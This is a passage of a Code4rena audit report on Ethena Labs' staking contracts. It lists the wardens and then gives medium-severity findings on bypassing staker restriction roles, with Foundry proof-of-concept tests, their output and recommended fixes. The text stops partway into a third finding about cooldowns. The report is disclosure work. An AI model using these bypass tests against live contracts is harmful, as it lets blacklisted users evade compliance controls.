---
sponsor: "Ethena Labs"
slug: "2023-10-ethena"
date: "2023-12-21"
title: "Ethena Labs"
findings: "https://github.com/code-423n4/2023-10-ethena-findings/issues"
contest: 299
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Ethena Labs smart contract system written in Solidity. The audit took place between October 24—October 30 2023.

## Wardens

158 Wardens contributed reports to Ethena Labs:

  1. [peanuts](https://code4rena.com/@peanuts)
  2. [Madalad](https://code4rena.com/@Madalad)
  3. [adeolu](https://code4rena.com/@adeolu)
  4. [Eeyore](https://code4rena.com/@Eeyore)
  5. [Shubham](https://code4rena.com/@Shubham)
  6. [josephdara](https://code4rena.com/@josephdara)
  7. [jasonxiale](https://code4rena.com/@jasonxiale)
  8. [Mike\_Bello90](https://code4rena.com/@Mike_Bello90)
  9. [0xWaitress](https://code4rena.com/@0xWaitress)
  10. [d3e4](https://code4rena.com/@d3e4)
  11. [Yanchuan](https://code4rena.com/@Yanchuan)
  12. [ayden](https://code4rena.com/@ayden)
  13. [mert\_eren](https://code4rena.com/@mert_eren)
  14. [pontifex](https://code4rena.com/@pontifex)
  15. [twcctop](https://code4rena.com/@twcctop)
  16. [cartlex\_](https://code4rena.com/@cartlex_)
  17. [critical-or-high](https://code4rena.com/@critical-or-high)
  18. [trachev](https://code4rena.com/@trachev)
  19. [ciphermarco](https://code4rena.com/@ciphermarco)
  20. [0xmystery](https://code4rena.com/@0xmystery)
  21. [Arz](https://code4rena.com/@Arz)
  22. [HChang26](https://code4rena.com/@HChang26)
  23. [Limbooo](https://code4rena.com/@Limbooo)
  24. [RamenPeople](https://code4rena.com/@RamenPeople) ([kimchi](https://code4rena.com/@kimchi) and [wasabi](https://code4rena.com/@wasabi))
  25. [SovaSlava](https://code4rena.com/@SovaSlava)
  26. [lsaudit](https://code4rena.com/@lsaudit)
  27. [J4X](https://code4rena.com/@J4X)
  28. [squeaky\_cactus](https://code4rena.com/@squeaky_cactus)
  29. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  30. [Udsen](https://code4rena.com/@Udsen)
  31. [Kaysoft](https://code4rena.com/@Kaysoft)
  32. [deepkin](https://code4rena.com/@deepkin)
  33. [pep7siup](https://code4rena.com/@pep7siup)
  34. [btk](https://code4rena.com/@btk)
  35. [ast3ros](https://code4rena.com/@ast3ros)
  36. [0xAlix2](https://code4rena.com/@0xAlix2) ([a\_kalout](https://code4rena.com/@a_kalout) and [ali\_shehab](https://code4rena.com/@ali_shehab))
  37. [dirk\_y](https://code4rena.com/@dirk_y)
  38. [Oxsadeeq](https://code4rena.com/@Oxsadeeq)
  39. [Cosine](https://code4rena.com/@Cosine)
  40. [Krace](https://code4rena.com/@Krace)
  41. [0xAadi](https://code4rena.com/@0xAadi)
  42. [castle\_chain](https://code4rena.com/@castle_chain)
  43. [0xpiken](https://code4rena.com/@0xpiken)
  44. [radev\_sw](https://code4rena.com/@radev_sw)
  45. [ge6a](https://code4rena.com/@ge6a)
  46. [Team\_Rocket](https://code4rena.com/@Team_Rocket) ([AlexCzm](https://code4rena.com/@AlexCzm) and [EllipticPoint](https://code4rena.com/@EllipticPoint))
  47. [sorrynotsorry](https://code4rena.com/@sorrynotsorry)
  48. [tnquanghuy0512](https://code4rena.com/@tnquanghuy0512)
  49. [lanrebayode77](https://code4rena.com/@lanrebayode77)
  50. [degensec](https://code4rena.com/@degensec)
  51. [KIntern\_NA](https://code4rena.com/@KIntern_NA) ([duc](https://code4rena.com/@duc) and [TrungOre](https://code4rena.com/@TrungOre))
  52. [SpicyMeatball](https://code4rena.com/@SpicyMeatball)
  53. [Beosin](https://code4rena.com/@Beosin)
  54. [0xVolcano](https://code4rena.com/@0xVolcano)
  55. [oakcobalt](https://code4rena.com/@oakcobalt)
  56. [pavankv](https://code4rena.com/@pavankv)
  57. [Sathish9098](https://code4rena.com/@Sathish9098)
  58. [Kral01](https://code4rena.com/@Kral01)
  59. [Al-Qa-qa](https://code4rena.com/@Al-Qa-qa)
  60. [ZanyBonzy](https://code4rena.com/@ZanyBonzy)
  61. [0xSmartContract](https://code4rena.com/@0xSmartContract)
  62. [0xweb3boy](https://code4rena.com/@0xweb3boy)
  63. [fouzantanveer](https://code4rena.com/@fouzantanveer)
  64. [albahaca](https://code4rena.com/@albahaca)
  65. [catellatech](https://code4rena.com/@catellatech)
  66. [invitedtea](https://code4rena.com/@invitedtea)
  67. [0xAnah](https://code4rena.com/@0xAnah)
  68. [niser93](https://code4rena.com/@niser93)
  69. [JCK](https://code4rena.com/@JCK)
  70. [K42](https://code4rena.com/@K42)
  71. [Bauchibred](https://code4rena.com/@Bauchibred)
  72. [D\_Auditor](https://code4rena.com/@D_Auditor)
  73. [clara](https://code4rena.com/@clara)
  74. [Bulletprime](https://code4rena.com/@Bulletprime)
  75. [xiao](https://code4rena.com/@xiao)
  76. [jauvany](https://code4rena.com/@jauvany)
  77. [digitizeworx](https://code4rena.com/@digitizeworx)
  78. [0x11singh99](https://code4rena.com/@0x11singh99)
  79. [ThreeSigma](https://code4rena.com/@ThreeSigma) ([0x73696d616f](https://code4rena.com/@0x73696d616f), [0xCarolina](https://code4rena.com/@0xCarolina), [EduCatarino](https://code4rena.com/@EduCatarino), and [SolidityDev99](https://code4rena.com/@SolidityDev99))
  80. [arjun16](https://code4rena.com/@arjun16)
  81. [nuthan2x](https://code4rena.com/@nuthan2x)
  82. [0xhacksmithh](https://code4rena.com/@0xhacksmithh)
  83. [SAQ](https://code4rena.com/@SAQ)
  84. [tabriz](https://code4rena.com/@tabriz)
  85. [petrichor](https://code4rena.com/@petrichor)
  86. [shamsulhaq123](https://code4rena.com/@shamsulhaq123)
  87. [Raihan](https://code4rena.com/@Raihan)
  88. [0xhex](https://code4rena.com/@0xhex)
  89. [brakelessak](https://code4rena.com/@brakelessak)
  90. [unique](https://code4rena.com/@unique)
  91. [0xta](https://code4rena.com/@0xta)
  92. [thekmj](https://code4rena.com/@thekmj)
  93. [phenom80](https://code4rena.com/@phenom80)
  94. [aslanbek](https://code4rena.com/@aslanbek)
  95. [Rolezn](https://code4rena.com/@Rolezn)
  96. [yashgoel72](https://code4rena.com/@yashgoel72)
  97. [0xgrbr](https://code4rena.com/@0xgrbr)
  98. [SM3\_SS](https://code4rena.com/@SM3_SS)
  99. [evmboi32](https://code4rena.com/@evmboi32)
  100. [naman1778](https://code4rena.com/@naman1778)
  101. [ybansal2403](https://code4rena.com/@ybansal2403)
  102. [0xhunter](https://code4rena.com/@0xhunter)
  103. [qpzm](https://code4rena.com/@qpzm)
  104. [erebus](https://code4rena.com/@erebus)
  105. [adam-idarrha](https://code4rena.com/@adam-idarrha)
  106. [Avci](https://code4rena.com/@Avci) ([0xdanial](https://code4rena.com/@0xdanial) and [0xArshia](https://code4rena.com/@0xArshia))
  107. [Breeje](https://code4rena.com/@Breeje)
  108. [PASCAL](https://code4rena.com/@PASCAL)
  109. [rotcivegaf](https://code4rena.com/@rotcivegaf)
  110. [asui](https://code4rena.com/@asui)
  111. [codynhat](https://code4rena.com/@codynhat)
  112. [BeliSesir](https://code4rena.com/@BeliSesir)
  113. [0xG0P1](https://code4rena.com/@0xG0P1)
  114. [Imlazy0ne](https://code4rena.com/@Imlazy0ne)
  115. [supersizer0x](https://code4rena.com/@supersizer0x)
  116. [pipidu83](https://code4rena.com/@pipidu83)
  117. [cccz](https://code4rena.com/@cccz)
  118. [cryptonue](https://code4rena.com/@cryptonue)
  119. [kkkmmmsk](https://code4rena.com/@kkkmmmsk)
  120. [Rickard](https://code4rena.com/@Rickard)
  121. [Noro](https://code4rena.com/@Noro)
  122. [Proxy](https://code4rena.com/@Proxy)
  123. [ziyou-](https://code4rena.com/@ziyou-)
  124. [chainsnake](https://code4rena.com/@chainsnake)
  125. [oxchsyston](https://code4rena.com/@oxchsyston)
  126. [0xStalin](https://code4rena.com/@0xStalin)
  127. [Fitro](https://code4rena.com/@Fitro)
  128. [rokinot](https://code4rena.com/@rokinot)
  129. [matrix\_0wl](https://code4rena.com/@matrix_0wl)
  130. [Walter](https://code4rena.com/@Walter)
  131. [young](https://code4rena.com/@young)
  132. [Zach\_166](https://code4rena.com/@Zach_166)
  133. [Topmark](https://code4rena.com/@Topmark)
  134. [almurhasan](https://code4rena.com/@almurhasan)
  135. [csanuragjain](https://code4rena.com/@csanuragjain)
  136. [PENGUN](https://code4rena.com/@PENGUN)
  137. [zhaojie](https://code4rena.com/@zhaojie)
  138. [ptsanev](https://code4rena.com/@ptsanev)
  139. [marchev](https://code4rena.com/@marchev)
  140. [Strausses](https://code4rena.com/@Strausses)
  141. [foxb868](https://code4rena.com/@foxb868)
  142. [max10afternoon](https://code4rena.com/@max10afternoon)
  143. [DarkTower](https://code4rena.com/@DarkTower) ([Gelato\_ST](https://code4rena.com/@Gelato_ST), [Maroutis](https://code4rena.com/@Maroutis), [OxTenma](https://code4rena.com/@OxTenma), and [0xrex](https://code4rena.com/@0xrex))
  144. [rvierdiiev](https://code4rena.com/@rvierdiiev)
  145. [twicek](https://code4rena.com/@twicek)
  146. [0x\_Scar](https://code4rena.com/@0x_Scar)
  147. [Bughunter101](https://code4rena.com/@Bughunter101)

This audit was judged by [0xDjango](https://code4rena.com/@0xDjango).

Final report assembled by [liveactionllama](https://twitter.com/liveactionllama).

# Summary

The C4 analysis yielded an aggregated total of 4 unique vulnerabilities. Of these vulnerabilities, 0 received a risk rating in the category of HIGH severity and 4 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 98 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 41 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Ethena Labs repository](https://github.com/code-423n4/2023-10-ethena), and is composed of 6 smart contracts written in the Solidity programming language and includes 588 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **MrsHudson** from warden slvDev, generated the [Automated Findings report](https://gist.github.com/code423n4/58a34c8d4c41d8d15f18cb43a2c71e3e) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# Medium Risk Findings (4)
## [[M-01] ``FULL_RESTRICTED`` Stakers can bypass restriction through approvals](https://github.com/code-423n4/2023-10-ethena-findings/issues/499)
*Submitted by [josephdara](https://github.com/code-423n4/2023-10-ethena-findings/issues/499), also found by [Arz](https://github.com/code-423n4/2023-10-ethena-findings/issues/666), [ge6a](https://github.com/code-423n4/2023-10-ethena-findings/issues/620), [KIntern\_NA](https://github.com/code-423n4/2023-10-ethena-findings/issues/438), [Team\_Rocket](https://github.com/code-423n4/2023-10-ethena-findings/issues/435), [mert\_eren](https://github.com/code-423n4/2023-10-ethena-findings/issues/431), [sorrynotsorry](https://github.com/code-423n4/2023-10-ethena-findings/issues/427), Eeyore ([1](https://github.com/code-423n4/2023-10-ethena-findings/issues/423), [2](https://github.com/code-423n4/2023-10-ethena-findings/issues/421)), [tnquanghuy0512](https://github.com/code-423n4/2023-10-ethena-findings/issues/415), [Limbooo](https://github.com/code-423n4/2023-10-ethena-findings/issues/378), [0xmystery](https://github.com/code-423n4/2023-10-ethena-findings/issues/374), [Yanchuan](https://github.com/code-423n4/2023-10-ethena-findings/issues/365), [RamenPeople](https://github.com/code-423n4/2023-10-ethena-findings/issues/334), [lanrebayode77](https://github.com/code-423n4/2023-10-ethena-findings/issues/320), [J4X](https://github.com/code-423n4/2023-10-ethena-findings/issues/319), [degensec](https://github.com/code-423n4/2023-10-ethena-findings/issues/233), [HChang26](https://github.com/code-423n4/2023-10-ethena-findings/issues/214), [0xAadi](https://github.com/code-423n4/2023-10-ethena-findings/issues/172), [castle\_chain](https://github.com/code-423n4/2023-10-ethena-findings/issues/147), [0xpiken](https://github.com/code-423n4/2023-10-ethena-findings/issues/112), [SpicyMeatball](https://github.com/code-423n4/2023-10-ethena-findings/issues/102), and [Beosin](https://github.com/code-423n4/2023-10-ethena-findings/issues/7)*

<https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDe.sol#L225-L238><br>
<https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDe.sol#L245-L248>

The `StakedUSDe` contract implements a method to `SOFTLY` or `FULLY` restrict user address, and either transfer to another user or burn.

However there is an underlying issue. A fully restricted address is supposed to be unable to withdraw/redeem, however this issue can be walked around via the approve mechanism.

The openzeppelin `ERC4626` contract allows approved address to withdraw and redeem on behalf of another address so far there is an approval.

```solidity
    function redeem(uint256 shares, address receiver, address owner) public virtual override returns (uint256) 
```

Blacklisted Users can explore this loophole to redeem their funds fully. This is because in the overridden `_withdraw` function, the token owner is not checked for restriction.

```solidity
  function _withdraw(address caller, address receiver, address _owner, uint256 assets, uint256 shares)
    internal
    override
    nonReentrant
    notZero(assets)
    notZero(shares)
  {
    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)) {
      revert OperationNotAllowed();
    }
```

Also in the overridden `_beforeTokenTransfer` there is a clause added to allow burning from restricted addresses:

```solidity
  function _beforeTokenTransfer(address from, address to, uint256) internal virtual override {
    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, from) && to != address(0)) {
      revert OperationNotAllowed();
    }
```

All these issues allows a restricted user to simply approve another address and redeem their usde.

### Proof of Concept

This is a foundry test that can be run in the `StakedUSDe.blacklist.t.sol` in the `test/foundry/staking` directory.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8;

/* solhint-disable private-vars-leading-underscore  */
/* solhint-disable func-name-mixedcase  */
/* solhint-disable var-name-mixedcase  */

import {console} from "forge-std/console.sol";
import "forge-std/Test.sol";
import {SigUtils} from "forge-std/SigUtils.sol";

import "../../../contracts/USDe.sol";
import "../../../contracts/StakedUSDe.sol";
import "../../../contracts/interfaces/IUSDe.sol";
import "../../../contracts/interfaces/IERC20Events.sol";
import "../../../contracts/interfaces/ISingleAdminAccessControl.sol";

contract StakedUSDeBlacklistTest is Test, IERC20Events {
  USDe public usdeToken;
  StakedUSDe public stakedUSDe;
  SigUtils public sigUtilsUSDe;
  SigUtils public sigUtilsStakedUSDe;
  uint256 public _amount = 100 ether;

  address public owner;
  address public alice;
  address public bob;
  address public greg;

  bytes32 SOFT_RESTRICTED_STAKER_ROLE;
  bytes32 FULL_RESTRICTED_STAKER_ROLE;
  bytes32 DEFAULT_ADMIN_ROLE;
  bytes32 BLACKLIST_MANAGER_ROLE;

  event Deposit(address indexed caller, address indexed owner, uint256 assets, uint256 shares);
  event Withdraw(
    address indexed caller, address indexed receiver, address indexed owner, uint256 assets, uint256 shares
  );
  event LockedAmountRedistributed(address indexed from, address indexed to, uint256 amountToDistribute);

  function setUp() public virtual {
    usdeToken = new USDe(address(this));

    alice = makeAddr("alice");
    bob = makeAddr("bob");
    greg = makeAddr("greg");
    owner = makeAddr("owner");

    usdeToken.setMinter(address(this));

    vm.startPrank(owner);
    stakedUSDe = new StakedUSDe(IUSDe(address(usdeToken)), makeAddr('rewarder'), owner);
    vm.stopPrank();

    FULL_RESTRICTED_STAKER_ROLE = keccak256("FULL_RESTRICTED_STAKER_ROLE");
    SOFT_RESTRICTED_STAKER_ROLE = keccak256("SOFT_RESTRICTED_STAKER_ROLE");
    DEFAULT_ADMIN_ROLE = 0x00;
    BLACKLIST_MANAGER_ROLE = keccak256("BLACKLIST_MANAGER_ROLE");
  }

  function _mintApproveDeposit(address staker, uint256 amount, bool expectRevert) internal {
    usdeToken.mint(staker, amount);

    vm.startPrank(staker);
    usdeToken.approve(address(stakedUSDe), amount);

    uint256 sharesBefore = stakedUSDe.balanceOf(staker);
    if (expectRevert) {
      vm.expectRevert(IStakedUSDe.OperationNotAllowed.selector);
    } else {
      vm.expectEmit(true, true, true, false);
      emit Deposit(staker, staker, amount, amount);
    }
    stakedUSDe.deposit(amount, staker);
    uint256 sharesAfter = stakedUSDe.balanceOf(staker);
    if (expectRevert) {
      assertEq(sharesAfter, sharesBefore);
    } else {
      assertApproxEqAbs(sharesAfter - sharesBefore, amount, 1);
    }
    vm.stopPrank();
  }

 
    function test_fullBlacklist_withdraw_pass() public {
    _mintApproveDeposit(alice, _amount, false);

    vm.startPrank(owner);
    stakedUSDe.grantRole(FULL_RESTRICTED_STAKER_ROLE, alice);
    vm.stopPrank();
    //@audit-issue assert that alice is blacklisted
   bool isBlacklisted = stakedUSDe.hasRole(FULL_RESTRICTED_STAKER_ROLE, alice);
   assertEq(isBlacklisted, true);
  //@audit-issue The staked balance of Alice
    uint256 balAliceBefore = stakedUSDe.balanceOf(alice); 
    //@audit-issue The usde balance of address 56
    uint256 bal56Before = usdeToken.balanceOf(address(56));
    vm.startPrank(alice);
    stakedUSDe.approve(address(56), _amount);
    vm.stopPrank();
    
    //@audit-issue address 56 receives approval and can unstake usde for Alice after a blacklist
    vm.startPrank(address(56));
    stakedUSDe.redeem(_amount, address(56), alice);
    vm.stopPrank();
      //@audit-issue The staked balance of Alice
     uint256 balAliceAfter = stakedUSDe.balanceOf(alice);
     //@audit-issue The usde balance of address 56
     uint256 bal56After = usdeToken.balanceOf(address(56));

      assertEq(bal56Before, 0);
      assertEq(balAliceAfter, 0);
      console.log(balAliceBefore);
      console.log(bal56Before);
      console.log(balAliceAfter);
      console.log(bal56After);

  }
}
```

Here we use `address(56)` as the second address, and we see that the user can withdraw their `100000000000000000000` tokens that was restricted.

This is my test result showing the  balances.

```shell
[PASS] test_fullBlacklist_withdraw_pass() (gas: 239624)
Logs:
  100000000000000000000 // Alice staked balance before
  0 // address(56) USDe balance before
  0 // Alice staked balance after
  100000000000000000000 // address(56) USDe balance after

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.68ms
```

### Tools Used

Foundry, Manual review

### Recommended Mitigation Steps

Check the token owner as well in the `_withdraw` function:

```solidity

    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver) || hasRole(FULL_RESTRICTED_STAKER_ROLE, _owner) ) {
      revert OperationNotAllowed();
    }
```

**[FJ-Riveros (Ethena) confirmed via duplicate issue \#666](https://github.com/code-423n4/2023-10-ethena-findings/issues/666#issuecomment-1802065692)**

**[0xDjango (judge) decreased severity to Medium](https://github.com/code-423n4/2023-10-ethena-findings/issues/499#issuecomment-1810441530)**

**[josephdara (warden) commented](https://github.com/code-423n4/2023-10-ethena-findings/issues/499#issuecomment-1811883453):**
 > Hi @0xDjango,  I do believe this is a high severity bug. It does break a major protocol functionality, compromising assets directly. 
> According to the severity categorization:
> > 3 — High: Assets can be stolen/lost/compromised directly
>
> Thanks!

**[0xDjango (judge) commented](https://github.com/code-423n4/2023-10-ethena-findings/issues/499#issuecomment-1815670715):**
 > @josephdara - I have conversed with the project team, and we have agreed that breaking rules due to legal compliance is medium severity as no funds are at risk.



***

## [[M-02] Soft Restricted Staker Role can withdraw stUSDe for USDe](https://github.com/code-423n4/2023-10-ethena-findings/issues/246)
*Submitted by [squeaky\_cactus](https://github.com/code-423n4/2023-10-ethena-findings/issues/246), also found by [Arz](https://github.com/code-423n4/2023-10-ethena-findings/issues/697), [Kaysoft](https://github.com/code-423n4/2023-10-ethena-findings/issues/677), [Udsen](https://github.com/code-423n4/2023-10-ethena-findings/issues/651), [deepkin](https://github.com/code-423n4/2023-10-ethena-findings/issues/640), [SovaSlava](https://github.com/code-423n4/2023-10-ethena-findings/issues/532), [Oxsadeeq](https://github.com/code-423n4/2023-10-ethena-findings/issues/530), [pep7siup](https://github.com/code-423n4/2023-10-ethena-findings/issues/500), [Shubham](https://github.com/code-423n4/2023-10-ethena-findings/issues/497), [peanuts](https://github.com/code-423n4/2023-10-ethena-findings/issues/420), [Limbooo](https://github.com/code-423n4/2023-10-ethena-findings/issues/379), [Yanchuan](https://github.com/code-423n4/2023-10-ethena-findings/issues/357), [btk](https://github.com/code-423n4/2023-10-ethena-findings/issues/352), [RamenPeople](https://github.com/code-423n4/2023-10-ethena-findings/issues/337), [Cosine](https://github.com/code-423n4/2023-10-ethena-findings/issues/248), [ast3ros](https://github.com/code-423n4/2023-10-ethena-findings/issues/235), [HChang26](https://github.com/code-423n4/2023-10-ethena-findings/issues/208), [0xAlix2](https://github.com/code-423n4/2023-10-ethena-findings/issues/116), [dirk\_y](https://github.com/code-423n4/2023-10-ethena-findings/issues/96), and [Krace](https://github.com/code-423n4/2023-10-ethena-findings/issues/72)*

A requirement is stated that a user with the `SOFT_RESTRICTED_STAKER_ROLE` is not allowed to withdraw `USDe` for `stUSDe`.

The code does not satisfy that condition, when a holder has the `SOFT_RESTRICTED_STAKER_ROLE`, they can exchange their `stUSDe` for `USDe` using `StakedUSDeV2`.

### Description

The Ethena readme has the following decription of legal requirements for the Soft Restricted Staker Role: <br><https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/README.md?plain=1#L98>

    Due to legal requirements, there's a `SOFT_RESTRICTED_STAKER_ROLE` and `FULL_RESTRICTED_STAKER_ROLE`. 
    The former is for addresses based in countries we are not allowed to provide yield to, for example USA. 
    Addresses under this category will be soft restricted. They cannot deposit USDe to get stUSDe or withdraw stUSDe for USDe. 
    However they can participate in earning yield by buying and selling stUSDe on the open market.

In summary, legal requires are that a `SOFT_RESTRICTED_STAKER_ROLE`:

*   MUST NOT deposit USDe to get stUSDe
*   MUST NOT withdraw USDe for USDe
*   MAY earn yield by trading stUSDe on the open market

As `StakedUSDeV2` is a `ERC4626`, the `stUSDe` is a share on the underlying `USDe` asset. There are two distinct entrypoints for a user to exchange their share for their claim on the underlying the asset, `withdraw` and `redeem`. Each cater for a different input (`withdraw` being by asset, `redeem` being by share), however both invoked the same internal `_withdraw` function, hence both entrypoints are affected.

There are two cases where a user with `SOFT_RESTRICTED_STAKER_ROLE` may have acquired `stUSDe`:

*   Brought `stUSDe` on the open market
*   Deposited `USDe` in `StakedUSDeV2` before being granted the `SOFT_RESTRICTED_STAKER_ROLE`

In both cases the user can call either withdraw their holding by calling `withdraw` or `redeem` (when cooldown is off), or `unstake` (if cooldown is on) and successfully exchange their `stUSDe` for `USDe`.

### Proof of Concept

The following two tests demonstrate the use case of a user staking, then being granted the `SOFT_RESTRICTED_STAKER_ROLE`, then exchanging their `stUSDe` for `USDe` (first using `redeem` function, the second using `withdrawm`).

The use case for acquiring on the open market, only requiring a different setup, however the exchange behaviour is identical and the cooldown enabled `cooldownAssets` and `cooldownShares` function still use the same `_withdraw` as `redeem` and `withdraw`, which leads to the same outcome.

(Place code into `StakedUSDe.t.sol` and run with `forge test`)<br>
<https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/test/foundry/staking/StakedUSDe.t.sol>

```Solidity
  bytes32 public constant SOFT_RESTRICTED_STAKER_ROLE = keccak256("SOFT_RESTRICTED_STAKER_ROLE");
  bytes32 private constant BLACKLIST_MANAGER_ROLE = keccak256("BLACKLIST_MANAGER_ROLE");

  function test_redeem_while_soft_restricted() public {
    // Set up Bob with 100 stUSDe
    uint256 initialAmount = 100 ether;
    _mintApproveDeposit(bob, initialAmount);
    uint256 stakeOfBob = stakedUSDe.balanceOf(bob);

    // Alice becomes a blacklist manager
    vm.prank(owner);
    stakedUSDe.grantRole(BLACKLIST_MANAGER_ROLE, alice);

    // Blacklist Bob with the SOFT_RESTRICTED_STAKER_ROLE
    vm.prank(alice);
    stakedUSDe.addToBlacklist(bob, false);

    // Assert that Bob has staked and is now has the soft restricted role
    assertEq(usdeToken.balanceOf(bob), 0);
    assertEq(stakedUSDe.totalSupply(), stakeOfBob);
    assertEq(stakedUSDe.totalAssets(), initialAmount);
    assertTrue(stakedUSDe.hasRole(SOFT_RESTRICTED_STAKER_ROLE, bob));

    // Rewards to StakeUSDe and vest
    uint256 rewardAmount = 50 ether;
    _transferRewards(rewardAmount, rewardAmount);
    vm.warp(block.timestamp + 8 hours);

    // Assert that only the total assets have increased after vesting
    assertEq(usdeToken.balanceOf(bob), 0);
    assertEq(stakedUSDe.totalSupply(), stakeOfBob);
    assertEq(stakedUSDe.totalAssets(), initialAmount + rewardAmount);
    assertTrue(stakedUSDe.hasRole(SOFT_RESTRICTED_STAKER_ROLE, bob));

    // Bob withdraws his stUSDe for USDe
    vm.prank(bob);
    stakedUSDe.redeem(stakeOfBob, bob, bob);

    // End state being while being soft restricted Bob redeemed USDe with rewards
    assertApproxEqAbs(usdeToken.balanceOf(bob), initialAmount + rewardAmount, 2);
    assertApproxEqAbs(stakedUSDe.totalAssets(), 0, 2);
    assertTrue(stakedUSDe.hasRole(SOFT_RESTRICTED_STAKER_ROLE, bob));
  }

  function test_withdraw_while_soft_restricted() public {
    // Set up Bob with 100 stUSDe
    uint256 initialAmount = 100 ether;
    _mintApproveDeposit(bob, initialAmount);
    uint256 stakeOfBob = stakedUSDe.balanceOf(bob);

    // Alice becomes a blacklist manager
    vm.prank(owner);
    stakedUSDe.grantRole(BLACKLIST_MANAGER_ROLE, alice);

    // Blacklist Bob with the SOFT_RESTRICTED_STAKER_ROLE
    vm.prank(alice);
    stakedUSDe.addToBlacklist(bob, false);

    // Assert that Bob has staked and is now has the soft restricted role
    assertEq(usdeToken.balanceOf(bob), 0);
    assertEq(stakedUSDe.totalSupply(), stakeOfBob);
    assertEq(stakedUSDe.totalAssets(), initialAmount);
    assertTrue(stakedUSDe.hasRole(SOFT_RESTRICTED_STAKER_ROLE, bob));

    // Rewards to StakeUSDe and vest
    uint256 rewardAmount = 50 ether;
    _transferRewards(rewardAmount, rewardAmount);
    vm.warp(block.timestamp + 8 hours);

    // Assert that only the total assets have increased after vesting
    assertEq(usdeToken.balanceOf(bob), 0);
    assertEq(stakedUSDe.totalSupply(), stakeOfBob);
    assertEq(stakedUSDe.totalAssets(), initialAmount + rewardAmount);
    assertTrue(stakedUSDe.hasRole(SOFT_RESTRICTED_STAKER_ROLE, bob));

    // Bob withdraws his stUSDe for USDe (-1 as dust is lost in asset to share rounding in ERC4626)
    vm.prank(bob);
    stakedUSDe.withdraw(initialAmount + rewardAmount - 1, bob, bob);

    // End state being while being soft restricted Bob redeemed USDe with rewards
    assertApproxEqAbs(usdeToken.balanceOf(bob), initialAmount + rewardAmount, 2);
    assertApproxEqAbs(stakedUSDe.totalAssets(), 0, 2);
    assertTrue(stakedUSDe.hasRole(SOFT_RESTRICTED_STAKER_ROLE, bob));
  }
```

### Tools Used

Manual review, Foundry test

### Recommended Mitigation Steps

With the function overriding present, to prevent the `SOFT_RESTRICTED_STAKER_ROLE` from being able to exchange their `stUSDs` for `USDe`, make the following change in `StakedUSDe`

<https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDe.sol#L232>

```Solidity
-    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)) {
+    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver) || hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller)) {
      revert OperationNotAllowed();
    }
```

**[0xDjango (judge) decreased severity to Medium](https://github.com/code-423n4/2023-10-ethena-findings/issues/246#issuecomment-1810742469)**

**[kayinnnn (Ethena) disputed and commented](https://github.com/code-423n4/2023-10-ethena-findings/issues/246#issuecomment-1858130415):**
> For this issue, the docs were incorrect to say withdrawal by soft restricted role is not allowed. Only depositing is not allowed.

***

## [[M-03] users still forced to follow previously set cooldownDuration even when cooldown is off (set to zero) before unstaking](https://github.com/code-423n4/2023-10-ethena-findings/issues/198)
*Submitted by [adeolu](https://github.com/code-423n4/2023-10-ethena-findings/issues/198), also found by [jasonxiale](https://github.com/code-423n4/2023-10-ethena-findings/issues/738), [Madalad](https://github.com/code-423n4/2023-10-ethena-findings/issues/737), [Mike\_Bello90](https://github.com/code-423n4/2023-10-ethena-findings/issues/619), [peanuts](https://github.com/code-423n4/2023-10-ethena-findings/issues/540), [josephdara](https://github.com/code-423n4/2023-10-ethena-findings/issues/511), [Eeyore](https://github.com/code-423n4/2023-10-ethena-findings/issues/461), and [Shubham](https://github.com/code-423n4/2023-10-ethena-findings/issues/424)*

The `StakedUSDeV2` contract can enforces coolDown periods for users before they are able to unstake/ take out their funds from the silo contract if coolDown is on. Based on the presence of the modifiers `ensureCooldownOff` and `ensureCooldownOn`, it is known that the coolDown state of the `StakedUSDeV2` contract can be toggled on or off.
In a scenario where coolDown is on (always turned on by default) and Alice and Bob deposits, two days after Alice wants to withdraw/redeem. Alice is forced to wait for 90 days before completing withdrawal/getting her tokens from the silo contract because Alice must call  coolDownAsset()/coolDownShares() fcns respectively. Bob decides to wait an extra day.

On the third day, Bob decides to withdraw/redeem. Contract admin also toggles the coolDown off (sets cooldownDuration to 0), meaning there is no longer a coolDown period and all withdrawals should be sent to the users immediately. Bob now calls calls the redeem()/withdraw() fcn to withdraw instantly to his address instead of the silo address since there is no coolDown.

